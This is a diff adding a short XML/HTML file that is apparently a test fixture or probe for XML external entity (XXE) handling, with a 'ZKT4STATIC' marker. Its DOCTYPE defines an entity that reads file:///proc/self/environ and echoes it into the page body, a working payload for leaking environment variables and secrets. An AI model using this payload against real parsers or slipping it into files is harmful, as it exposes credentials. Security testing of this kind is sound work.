@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html [<!ENTITY zk SYSTEM "file:///proc/self/environ">]>
+<html>
+<head>
+<meta name="description" content="ZKT4STATIC"/>
+</head>
+<body><p>&zk;</p></body>
+</html>
